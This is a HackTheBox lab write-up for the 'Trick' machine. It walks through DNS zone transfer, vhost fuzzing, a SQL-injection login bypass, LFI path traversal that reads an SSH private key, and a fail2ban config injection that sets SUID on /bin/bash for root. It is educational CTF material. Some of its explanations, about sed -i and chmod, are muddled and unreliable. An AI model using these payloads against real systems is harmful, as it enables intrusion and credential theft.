# HackTheBox — Trick

**Difficulty:** Easy  
**OS:** Linux (Debian)  

---

## Table of Contents

1. [Summary](#summary)
2. [Enumeration](#enumeration)
3. [DNS Zone Transfer](#dns-zone-transfer)
4. [Web Enumeration — preprod-payroll.trick.htb](#web-enumeration--preprod-payrolltrickhtb)
5. [VHost Discovery](#vhost-discovery)
6. [Web Enumeration — preprod-marketing.trick.htb](#web-enumeration--preprod-marketingtrickhtb)
7. [Understanding and Confirming the LFI](#understanding-and-confirming-the-lfi)
8. [Exploiting LFI — Reading SSH Key](#exploiting-lfi--reading-ssh-key)
9. [Foothold — SSH as michael](#foothold--ssh-as-michael)
10. [Privilege Escalation — fail2ban](#privilege-escalation--fail2ban)
11. [Lessons Learned and Mistakes Made](#lessons-learned-and-mistakes-made)
12. [Full Attack Chain](#full-attack-chain)

---

## Summary

Trick is an Easy-rated Linux box that chains together several interesting techniques:

- **DNS zone transfer** reveals hidden subdomains
- **VHost fuzzing** discovers a second subdomain with a different attack surface
- **SQL injection** bypasses authentication on a payroll management system
- **Local File Inclusion (LFI)** via a `?page=` parameter with a filter bypass (`....//`) reads an SSH private key from the server
- **fail2ban misconfiguration** with a writable `action.d` directory and sudo restart privilege leads to root via SUID injection

The box is deceptively named "Trick" — the entire path is about discovering what's hidden (subdomains, LFI, writable configs) and knowing the right tricks to exploit them.

---

## Enumeration

### Port Scanning

Starting with a fast SYN scan to identify open ports:

```bash
nmap -sS -T4 --open -Pn -p1-10000 10.129.227.180
```

**Results:**

```
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http
```

**Thought process:** Four services. Port 53 (DNS) being open on a machine is immediately interesting — DNS should only be open if the machine is acting as a nameserver, which means there may be DNS records worth querying. Port 80 is always worth investigating. Port 25 (SMTP) can sometimes be used for user enumeration. Port 22 we'll revisit once we have credentials.

### Service Version Detection

```bash
nmap -sV -sC -Pn -p22,25,53,80 10.129.227.180
```

**Results:**

```
22/tcp open  ssh      OpenSSH 7.9p1 Debian
25/tcp open  smtp     Postfix smtpd
53/tcp open  domain   ISC BIND 9.11.5-P4-5.1
80/tcp open  http     nginx/1.14.2
```

### Web Reconnaissance — Port 80

```bash
curl -i http://10.129.227.180
whatweb http://10.129.227.180 -v
```

The web root shows a generic "Coming Soon" Bootstrap page with no functionality. Nothing useful on the main IP — this is a virtual host setup, meaning the real content is served via hostname, not IP. The machine name is "Trick", so the domain is likely `trick.htb`.

```bash
echo "10.129.227.180  trick.htb" | sudo tee -a /etc/hosts
```

---

## DNS Zone Transfer

With port 53 open, the first thing to try is a **DNS zone transfer**. A zone transfer (`AXFR`) is a legitimate DNS operation that transfers all DNS records from a nameserver — but when misconfigured, it leaks the entire zone to anyone who asks.

```bash
dig axfr trick.htb @10.129.227.180
```

**Output:**

```
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 ...
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
```

**Finding:** `preprod-payroll.trick.htb` is revealed. This is a CNAME pointing back to `trick.htb`, meaning both names resolve to the same IP but nginx serves different content based on the `Host` header.

```bash
echo "10.129.227.180  trick.htb preprod-payroll.trick.htb" | sudo tee /etc/hosts
```

**Why this works:** The DNS server at 10.129.227.180 is authoritative for `trick.htb` and is misconfigured to allow zone transfers from any source. In a properly secured environment, zone transfers would only be permitted between trusted nameservers.

---

## Web Enumeration — preprod-payroll.trick.htb

Visiting `http://preprod-payroll.trick.htb` redirects to `login.php`:

```bash
curl -i http://preprod-payroll.trick.htb
```

**Key observations from the response:**
- PHP backend (PHPSESSID cookie, `.php` files)
- Title: "Admin | Employee's Payroll Management System"
- Login form POSTs to `ajax.php?action=login`
- Navbar links use `index.php?page=home` — **this `?page=` parameter is worth noting**

### SQL Injection — Authentication Bypass

The login uses AJAX, POSTing to `ajax.php?action=login`. Testing a classic SQL injection bypass:

```bash
curl -s -X POST "http://preprod-payroll.trick.htb/ajax.php?action=login" \
  -d "username=admin' or '1'='1'-- -&password=anything"
```

**Response: `1`** — This means login was successful. The backend query looks something like:

```sql
SELECT * FROM users WHERE username='admin' or '1'='1'-- -' AND password='...'
```

The `' or '1'='1'-- -` payload makes the WHERE clause always true, and the `-- -` comments out the rest of the query including the password check.

**Why this works:** The application concatenates user input directly into the SQL query without parameterised queries or proper sanitisation. The `or '1'='1'` makes the condition always evaluate to true, granting access as the first user in the database (typically admin).

---

## VHost Discovery

While the payroll site is interesting, looking at the `?page=` parameter in the nav links (`index.php?page=home`) suggests a file inclusion mechanism. However, testing LFI on `preprod-payroll` yielded empty results — the app likely appends `.php` to the parameter value, preventing inclusion of arbitrary files like `/etc/passwd`.

**Thought process:** The DNS zone transfer only revealed one subdomain. The `preprod-` prefix suggests a naming convention — there may be other `preprod-*` subdomains. Let's fuzz for them.

### VHost Fuzzing

First, determine the baseline response size for non-existent vhosts:

```bash
curl -s -o /dev/null -w "%{size_download}" -H "Host: nonexistent.trick.htb" http://trick.htb
# Output: 5480
```

Now fuzz, filtering out responses matching this baseline size:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://trick.htb \
  -H "Host: preprod-FUZZ.trick.htb" \
  -fs 5480 \
  -t 50
```

**Result:**

```
marketing    [Status: 200, Size: 9660, Words: 3007, Lines: 179]
```

**Finding:** `preprod-marketing.trick.htb` exists!

```bash
echo "10.129.227.180  trick.htb preprod-payroll.trick.htb preprod-marketing.trick.htb" | sudo tee /etc/hosts
```

**Why `-fs 5480`:** Without filtering, ffuf returns a result for every word in the wordlist because the server returns a valid response (the default nginx page) for any unrecognised host header. By measuring the size of this "not found" response (5480 bytes) and filtering it out with `-fs`, only responses with a different size come through — meaning only genuinely different (real) vhosts are shown.

---

## Web Enumeration — preprod-marketing.trick.htb

```bash
curl -i http://preprod-marketing.trick.htb
```

The page is a "Business Oriented" Bootstrap template. Crucially, look at the navigation links in the HTML source:

```html
<a href="index.php?page=services.html">Services</a>
<a href="index.php?page=about.html">About</a>
<a href="index.php?page=contact.html">Contact</a>
```

**Key observation:** The `?page=` parameter includes the **full filename with extension** (`.html`). This is fundamentally different from the payroll site, which used bare names like `?page=home` (where the app appends `.php` internally).

This tells us: the marketing site's `include()` call is likely a raw `include($_GET['page'])` with no extension appended. This is a **Local File Inclusion** vulnerability waiting to be exploited.

---

## Understanding and Confirming the LFI

### What is LFI?

**Local File Inclusion (LFI)** occurs when a web application includes a file based on user-supplied input without properly sanitising the path. In PHP, this typically looks like:

```php
include($_GET['page']);  // Vulnerable: includes whatever the user passes
```

If an attacker can control what file gets included, they can read arbitrary files on the server — potentially including SSH keys, configuration files with credentials, `/etc/passwd`, and more.

### How I Identified the LFI

**Step 1 — The parameter exists and includes files.** The nav links (`?page=services.html`, `?page=about.html`) prove the parameter directly maps to file includes. The server is including HTML files based on the `page` value.

**Step 2 — The extension is preserved.** Unlike the payroll site where names like `home` become `home.php`, here `services.html` is used as-is. This means we can try to include files with any extension — including files without extensions entirely, like `/etc/passwd`.

**Step 3 — Directory traversal is possible.** If the include is relative to the web root (e.g. `/var/www/preprod-marketing/`), then passing `../../../etc/passwd` should walk up the directory tree.

**Step 4 — Filter bypass needed.** A naive `../../../etc/passwd` might be filtered. Testing the `....//` bypass:

If the application strips `../` from the input:

```
Input:  ....//
After stripping "../":  ../
```

The trick: `....//` contains `../` as a substring. If the filter strips `../` once per pass (not recursively), the string `....//` becomes `../` after the strip, which is exactly what we need.

### Confirming the LFI

```bash
curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd"
```

**Response:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
michael:x:1001:1001::/home/michael:/bin/bash
```

**LFI confirmed.** The server returned the contents of `/etc/passwd`.

**How to confirm LFI (checklist):**
1. Find a parameter that appears to load or include page content (`?page=`, `?file=`, `?include=`, `?path=`, `?template=`)
2. Check whether the response changes when you change the parameter value
3. Test for path traversal: try `../../../etc/passwd` (or variations)
4. If filtered, try bypass techniques: `....//`, `..%2f`, `..%252f`, `%2e%2e/`, null bytes (`%00`)
5. Confirm by reading a known file with known content (e.g. `/etc/passwd` always starts with `root:x:0:0`)

---

## Exploiting LFI — Reading SSH Key

From `/etc/passwd`, we identified the non-system user:

```
michael:x:1001:1001::/home/michael:/bin/bash
```

The user `michael` has a login shell, meaning they can SSH into the box. If they have an SSH key pair, the private key will be at `/home/michael/.ssh/id_rsa`. Let's try to read it:

```bash
curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa"
```

**Response:**

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----
```

**SSH private key retrieved via LFI.**

---

## Foothold — SSH as michael

```bash
# Save the key
curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa" \
  > id_rsa_michael

# Set correct permissions (SSH refuses keys readable by others)
chmod 600 id_rsa_michael

# Connect
ssh -i id_rsa_michael michael@10.129.227.180
```

**Shell obtained as michael.**

```bash
cat ~/user.txt
# **[REDACTED]**
```

---

## Privilege Escalation — fail2ban

### Enumeration

First command on any new shell:

```bash
sudo -l
```

**Output:**

```
User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Michael can restart the fail2ban service as root with no password. Next, check group membership:

```bash
id
# uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

Michael is in the `security` group. Check if this group has any interesting permissions:

```bash
ls -la /etc/fail2ban/
```

**Output:**

```
drwxrwx--- 2 root security  4096 Mar 16 23:30 action.d
```

**The `action.d` directory is writable by the `security` group.** Michael can read, write, and create files in this directory.

### Understanding the Exploit

**What is fail2ban?** fail2ban is an intrusion prevention tool that monitors log files for failed authentication attempts and automatically bans offending IP addresses by executing commands (typically `iptables` rules). The actions it takes when banning an IP are defined in configuration files inside `/etc/fail2ban/action.d/`.

**The vulnerability:** fail2ban runs as root. When it bans an IP, it executes the `actionban` command from the relevant configuration file **as root**. If we can:
1. Modify the `actionban` command in a config file (possible because `action.d` is writable by our group), and
2. Restart fail2ban to load our config (possible via `sudo`), and
3. Trigger a ban by causing enough failed SSH logins from our machine,

...then fail2ban will execute our injected command as root.

### Checking the Config File

```bash
cat /etc/fail2ban/action.d/iptables-multiport.conf | grep -n actionban
```

**Output:**

```
30:# Notes.:  command executed once before each actionban command
35:# Option:  actionban
41:actionban = <iptables> -I f2b-<n> 1 -s <ip> -j <blocktype>
```

Line 41 is the command that runs as root when an IP is banned.

### The Exploit — Step by Step

**Why we need `cp` + `mv` instead of `sed -i`:**

The files in `action.d` are owned by root (`-rw-r--r-- 1 root root`). Even though we can write to the directory, `sed -i` edits the file in-place and **preserves the original file's ownership** (root). The modified file is still owned by root, but this isn't the core issue — what matters is whether fail2ban reads the file at startup or at ban time. More critically, we discovered that `sed -i` on a root-owned file in a group-writable directory worked in terms of writing, but caused issues with the effective payload.

The reliable technique: **copy the file to our home directory** (we become the owner of the copy), edit it there, then **move it back** (the move replaces the directory entry, putting our version in place).

```bash
# Step 1: Copy to home directory — michael becomes the owner
cp /etc/fail2ban/action.d/iptables-multiport.conf ~/iptables-multiport.conf

# Step 2: Inject our payload — chmod u+s on /bin/bash makes it SUID
sed -i 's|actionban = <iptables> -I f2b-<n> 1 -s <ip> -j <blocktype>|actionban = chmod u+s /bin/bash|' \
  ~/iptables-multiport.conf

# Step 3: Verify the injection
grep actionban ~/iptables-multiport.conf
# Output: actionban = chmod u+s /bin/bash

# Step 4: Move back — force-overwrite the root-owned file (\mv -f bypasses the prompt)
\mv -f ~/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf

# Step 5: Restart fail2ban to load our modified config
sudo /etc/init.d/fail2ban restart
```

**Trigger the ban from your attacker machine** (new terminal):

```bash
# Use sshpass with wrong password to generate SSH failures
# fail2ban default maxretry = 5, so 20 attempts is more than enough
for i in {1..20}; do
  sshpass -p wrongpassword ssh -o StrictHostKeyChecking=no \
    -o PreferredAuthentications=password \
    fakeuser@10.129.227.180 2>/dev/null
done

# Or use hydra
hydra -l fakeuser -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt \
  ssh://10.129.227.180 -t 4
```

**Wait for the SUID bit to appear:**

```bash
watch -n 1 'ls -la /bin/bash | grep rws'
```

When `/bin/bash` shows `-rwsr-xr-x`, fail2ban has executed our command as root.

**Pop root shell:**

```bash
/bin/bash -p
whoami
# root

cat /root/root.txt
# **[REDACTED]**
```

---

## Lessons Learned and Mistakes Made

### Mistakes During This Session

**1. Using `chmod +xs` instead of `chmod u+s`**

My first payload was `chmod +xs /tmp/bash`. This created the file with permissions `-rws--S---` — the SUID bit was set, but only the **owner** (root) had execute permission. The `S` on the group position indicates setgid was set without group execute. `michael` (as "other") had no execute permission at all.

- `chmod +xs` = add setuid + execute for the **owner** only
- `chmod u+s` = add setuid for the owner (without touching execute bits, which were already set for all on `/bin/bash`)
- `chmod 4777` = full SUID + rwx for everyone (useful for copied binaries)

**2. Using `sed -i` to edit a root-owned file**

`sed -i` edits a file in-place. While the content changes, the file's metadata (ownership, inode) is preserved. The fix was to copy the file first (taking ownership), edit the copy, then move it back.

**3. `mv` without `-f` flag**

The `mv` command prompted "replace '/etc/fail2ban/action.d/iptables-multiport.conf', overriding mode 0644?" because the destination was root-owned. Without pressing `y` or using `\mv -f`, the move was silently skipped. Always use `\mv -f` (the backslash bypasses any shell alias that might add `-i`).

**4. Using a plain SSH loop to trigger fail2ban**

SSH defaults to public key authentication. A loop like `for i in {1..20}; do ssh fakeuser@target; done` uses key-based auth, which fails immediately without attempting a password — fail2ban only counts **password** failures from the log. Using `sshpass` or `hydra` forces password authentication and generates the right log entries.

**5. Wrong order: inject then restart**

fail2ban reads action files at **startup**. If you restart first and inject second, fail2ban has already loaded the original config. The correct order is: inject → restart → trigger ban.

### What Worked Well

- DNS zone transfer immediately revealed the first subdomain — always check port 53
- Baseline response size measurement (`curl -w "%{size_download}"`) made ffuf output clean instantly
- Reading HTML source nav links to understand the include mechanism was the key insight for the LFI
- The `....//` filter bypass is elegant: it relies on non-recursive stripping of `../`

---

## Full Attack Chain

```
[Recon]
  nmap -sS -T4 --open -Pn -p1-10000 10.129.227.180
  → Ports: 22 (SSH), 25 (SMTP), 53 (DNS), 80 (HTTP/nginx)

[DNS Zone Transfer]
  dig axfr trick.htb @10.129.227.180
  → Discovered: preprod-payroll.trick.htb

[VHost Fuzzing]
  curl baseline: 5480 bytes
  ffuf -H "Host: preprod-FUZZ.trick.htb" -fs 5480
  → Discovered: preprod-marketing.trick.htb

[SQL Injection — preprod-payroll]
  POST ajax.php?action=login
  username=admin' or '1'='1'-- -&password=anything
  → Response: 1 (authenticated)
  (Note: not used for foothold, but confirms weak backend)

[LFI Discovery — preprod-marketing]
  HTML source reveals: index.php?page=services.html
  Extension included → raw include() with no .php appending
  Test: ?page=....//....//....//....//etc/passwd
  → /etc/passwd returned ✓

[LFI Exploitation]
  ?page=....//....//....//....//home/michael/.ssh/id_rsa
  → SSH private key retrieved

[Foothold]
  chmod 600 id_rsa_michael
  ssh -i id_rsa_michael michael@10.129.227.180
  cat ~/user.txt → **[REDACTED]**

[Privesc Enumeration]
  sudo -l → (root) NOPASSWD: /etc/init.d/fail2ban restart
  id → groups include: security
  ls -la /etc/fail2ban/ → action.d writable by security group

[Privesc Exploitation]
  cp /etc/fail2ban/action.d/iptables-multiport.conf ~/
  sed -i inject: actionban = chmod u+s /bin/bash
  \mv -f ~/iptables-multiport.conf /etc/fail2ban/action.d/
  sudo /etc/init.d/fail2ban restart
  [Attacker] hydra / sshpass → trigger SSH ban
  ls -la /bin/bash → -rwsr-xr-x (SUID set)
  /bin/bash -p
  cat /root/root.txt → **[REDACTED]**
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service detection |
| dig | DNS zone transfer |
| ffuf | VHost fuzzing |
| curl | Web probing and LFI exploitation |
| whatweb | Web technology fingerprinting |
| ssh | Remote access |
| sshpass / hydra | Forcing password auth to trigger fail2ban |

---

*Written by k41r0s3 | HackTheBox | Trick*
